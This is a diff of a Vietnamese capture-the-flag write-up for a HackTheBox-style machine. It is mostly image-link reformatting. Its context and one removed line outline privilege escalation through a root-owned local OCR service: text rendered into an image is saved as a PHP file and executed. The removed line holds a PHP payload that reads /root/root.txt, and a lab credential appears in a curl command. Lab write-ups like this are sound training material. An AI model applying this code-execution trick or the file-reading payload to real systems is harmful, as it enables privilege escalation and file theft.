@@ -36,8 +36,7 @@ weight: 2
 - upload ảnh chữ viết tay
 - OCR ra text
 - lưu text đó thành file trong thư mục saved/
-15. Tạo ảnh chứa payload PHP đơn giản:
-- <?php readfile("/root/root.txt");?>
+15. Tạo ảnh chứa payload PHP đơn giản
 16. Để app OCR lưu payload thành:
 - saved/rootflag.php
 17. Truy cập file đó qua service OCR và đọc:
@@ -136,7 +135,8 @@ curl -sk --tls-max 1.2 --http1.0 -H 'Host: makesense.htb' \
 ```
 
 Kết quả:
-![alt text](image.png)
+
+   ![](image.png)
 ```json
 [{"id":1,"name":"admin","url":"http:\/\/localhost:8000","slug":"admin"}]
 ```
@@ -544,7 +544,8 @@ Credential hợp lệ:
 - `user flag`: flag chứng minh đã chiếm được quyền người dùng thông thường trên box.
 
 Sau khi vào SSH bằng `walter`, kiểm tra home:
-![alt text](image-2.png)
+
+   ![](image-2.png)
 ```text
 /home/walter/user.txt
 ```
@@ -571,7 +572,7 @@ Từ `www-data`, kiểm tra port local:
 ```text
 127.0.0.1:8001 LISTEN
 ```
-![alt text](image-4.png)
+   ![](image-4.png)
 Kiểm tra process:
 
 ```text
@@ -582,7 +583,8 @@ php -S 127.0.0.1:8001 -t /root/ocr4/
 ### Tại sao đây là hướng priv-esc tốt
 
 - Service chạy bằng `root`.
-![alt text](image-5.png)
+
+   ![](image-5.png)
 - Không mở ra ngoài Internet.
 - Vừa có credential nội bộ, vừa có app custom, nên khả năng có bug logic là rất cao.
 
@@ -591,7 +593,8 @@ Khi truy cập từ localhost:
 ```bash
 curl -u walter:JbhHDAEgXvri3! http://127.0.0.1:8001/
 ```
-![alt text](image-3.png)
+
+   ![](image-3.png)
 Service chấp nhận Basic Auth với chính credential của `walter`.
 
 ### Tại sao credential này quan trọng
@@ -642,7 +645,7 @@ imagedestroy($im);
 echo filesize("/tmp/helloocr.png");'
 ```
 
-![alt text](image-6.png)
+   ![](image-6.png)
 
 
 ### Tại sao đây là primitive quan trọng
@@ -689,7 +692,7 @@ Mình tạo ảnh chứa payload trên theo font monospace, sau đó:
 3. Save output thành `saved/rootflag.php`
 4. Truy cập `http://127.0.0.1:8001/saved/rootflag.php` đống thời server thực thi file `php`
 
-![alt text](image-7.png)
+   ![](image-7.png)
 Kết quả:
 
 ```text
